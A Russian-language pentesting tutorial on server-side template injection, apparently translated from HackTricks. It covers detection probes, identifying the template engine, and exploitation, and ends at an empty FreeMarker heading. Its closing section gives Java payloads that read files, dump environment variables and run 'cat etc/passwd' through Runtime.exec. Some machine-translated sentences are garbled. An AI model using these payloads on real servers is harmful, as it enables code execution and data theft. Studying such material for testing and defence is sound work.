Что такое внедрение шаблонов на стороне сервера?[](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-server-side-template-injection)

Внедрение шаблона на стороне сервера происходит, когда злоумышленник может использовать собственный синтаксис шаблона для внедрения вредоносной полезной нагрузки в шаблон, который затем выполняется на стороне сервера.

**Механизмы шаблонов** предназначены для **создания веб-страниц** путем **объединения** **фиксированных** шаблонов с **изменчивыми** данными. Атаки с внедрением шаблона на стороне сервера могут происходить, когда **вводимые пользователем данные** объединяются непосредственно **в шаблон** , а не передаются в виде данных. Это позволяет злоумышленникам **вводить произвольные директивы шаблонов** , чтобы манипулировать механизмом шаблонов, что часто позволяет им получить **полный контроль над сервером** .

Пример уязвимого кода см. следующий:

```
$output = $twig->render("Dear " . $_GET['name']);
```

В предыдущем примере **часть самого шаблона** с **динамически генерируется** помощью `GET` параметр `name`. Поскольку синтаксис шаблона оценивается на стороне сервера, это потенциально позволяет злоумышленнику разместить полезную нагрузку для внедрения шаблона на стороне сервера внутри `name` параметр следующим образом:

```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```

Построение атаки с внедрением шаблона на стороне сервера[](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#constructing-a-server-side-template-injection-attack)

# Обнаружить

Как и в случае с любой уязвимостью, первый шаг к эксплуатации — это возможность ее найти. Возможно, самый простой первоначальный подход — попробовать **фаззинг шаблона** , введя последовательность специальных символов, обычно используемых в выражениях шаблона, таких как полиглот **`${{<%[%'"}}%\`****.** Для того, чтобы проверить, уязвим ли сервер, вы должны **найти различия** между ответом с **обычными данными** о параметре и **заданной полезной нагрузкой** . Если **выдается ошибка,** будет очень легко выяснить, что **сервер уязвим** , и даже какой **движок работает** . Но вы также можете найти уязвимый сервер, если ожидаете, **что** он будет **отражать** данную полезную нагрузку, а она **не отражается** или если **отсутствуют какие-либо символы .** в ответе

# Обнаружение — контекст открытого текста

Данный ввод обрабатывается **и отражается** в ответе. Это легко **принять за простую**, но ее легко отличить, если вы попытаетесь установить **математические операции** в выражении шаблона:

```
{{7*7}}
${7*7}
<%= 7*7%>
${{7*7}}
#{7*7}
*{7*7}
```

**Обнаружение — контекст кода**

В этих случаях **пользовательский ввод** помещается **в** выражение **шаблона** :

```
engine.render("Hello {{"+greeting+"}}", data)
```

URL-адрес доступа к этой странице может быть похож на: `http://vulnerable-website.com/?greeting=data.username`

Если **измените** вы **`greeting`**параметр для **другого значения** , ответ **не будет содержать имя пользователя** , но если вы получите доступ к чему-то вроде: `http://vulnerable-website.com/?greeting=data.username}}hello`то **ответ будет содержать имя пользователя** (если символы закрывающего выражения шаблона были **`}}`**). Если **во время этих тестов возникнет ошибка** , будет легче обнаружить, что сервер уязвим.

# Идентифицировать

После того, как вы обнаружили потенциал внедрения шаблона, следующим шагом будет определение механизма шаблона. Хотя существует огромное количество языков шаблонов, многие из них используют очень похожий синтаксис, специально выбранный таким образом, чтобы не конфликтовать с символами HTML.

Если вам повезет, сервер будет **печатать ошибки** , и вы сможете найти **движок** , используемый **внутри** ошибок. Некоторые возможные полезные нагрузки, которые могут вызвать ошибки:


| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            | 

В противном случае вам потребуется вручную **протестировать полезные данные для разных языков** и изучить, как они интерпретируются обработчиком шаблонов. Обычный способ сделать это — внедрить произвольные математические операции, используя синтаксис из разных шаблонизаторов. Затем вы можете наблюдать, успешно ли они оцениваются. Чтобы помочь в этом процессе, вы можете использовать дерево решений, подобное следующему:

![[Pasted image 20230212141236.png]]


# Эксплойт

## Читать

Первым шагом после обнаружения внедрения шаблона и определения механизма шаблонов является чтение документации. Ключевые области интересов:

Разделы «Для авторов шаблонов», посвященные основному синтаксису.

«Соображения безопасности» — скорее всего, тот, кто разработал приложение, которое вы тестируете, не читал его, и оно может содержать несколько полезных советов.

Списки встроенных методов, функций, фильтров и переменных.

Списки расширений/плагинов - некоторые из них могут быть включены по умолчанию.

## Исследовать

Предполагая, что никаких эксплойтов обнаружено не было, следующим шагом будет **изучение среды** , чтобы выяснить, к каким именно уязвимостям **у вас есть доступ** . Вы можете ожидать найти как **объекты по умолчанию** , предоставляемые обработчиком шаблонов, так и **объекты, специфичные для приложения,** переданные в шаблон разработчиком. Многие системы шаблонов предоставляют «я» или объект пространства имен, содержащий все в пределах области действия, а также идиоматический способ перечисления атрибутов и методов объекта.

Если нет встроенного объекта self, вам придется перебирать имена переменных, используя

и коллекцию списков слов Burp Intruder.

Предоставленные разработчиком объекты, как правило, содержат конфиденциальную информацию и могут различаться в разных шаблонах приложения, поэтому в идеале этот процесс следует применять к каждому отдельному шаблону отдельно.

# Атака

На этом этапе у вас должно быть **поверхности атаки** четкое представление о доступной вам , и вы должны быть в состоянии приступить к традиционным методам аудита безопасности, просматривая каждую функцию на наличие уязвимостей, которые можно использовать. Важно подходить к этому в контексте более широкого приложения — некоторые функции могут использоваться для использования функций, специфичных для приложения. В следующих примерах будет использоваться внедрение шаблона для создания произвольного объекта, чтения/записи произвольного файла, включения удаленного файла, раскрытия информации и повышения привилегий.
## Java

### Java - Basic injection

```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java - Retrieve the system’s environment variables

```
${T(java.lang.System).getenv()}
```

### Java - Retrieve /etc/passwd

```
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

```

### FreeMarker



















